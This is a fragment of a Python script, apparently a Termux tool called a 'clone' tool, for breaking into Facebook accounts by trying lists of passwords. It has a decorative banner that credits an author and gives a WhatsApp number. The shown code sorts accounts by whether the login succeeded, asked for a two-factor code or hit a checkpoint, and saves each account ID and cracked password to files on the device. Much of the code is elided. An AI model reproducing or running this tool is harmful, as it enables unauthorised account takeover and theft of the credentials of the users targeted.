...
ha = current.day
today = date.today()
JOKER2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
\033[1;39m======================================================
\033[1;37m╔ⒿⓄⓀⒺⓇ═════════════════\033[1;33m𝐒𝐇𝐀𝐇𝐈✯𝐉𝐎𝐊𝐄𝐑\033[1;37m══════════════ⒿⓄⓀⒺⓇ╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m𝐑𝐀𝐘𝐒𝐒 𝐃𝐀 𝐄𝐍𝐐𝐄𝐋𝐀𝐁𝐄 𝐘𝐀𝐑𝐀𝐍     \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32m𝐌𝐑 𝐑𝐀𝐘𝐒𝐒 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑\033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32m𝐑𝐀𝐘𝐒𝐒-𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+93707266012👈🏿 🤡            \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m0.4                     \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑             \033[1;31m   │
...
def my_tool_security():
    ...
    print("\t  Fb page  : JOKER Hbf Cammands")
    print("\t  Github   : JOKER-KHANOO")
    print(c, 45*"-")
    print(47*"-")
    try:
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_JOKER_VAI_CLONE_TOOL.mp3")
    os.getuid
...
def password():
    ...
    linex()
    print("")
    passX = input(f" {RED}CHOOSE{JOKER2} : ")
    if passX in ['1','01']:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio JOKER_OK.mp3")
                print('\r\033[1;32m[JOKER-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/JOKER-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio JOKER_2F.mp3")
                    print('\r\033[1;34m[JOKER-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/JOKER-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio JOKER_CP.mp3")
                    print(f'\r\033[1;30m[JOKER-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/JOKER-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[JOKER 🔥] [%s] \33[1;97m[OK:%s{JOKER2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
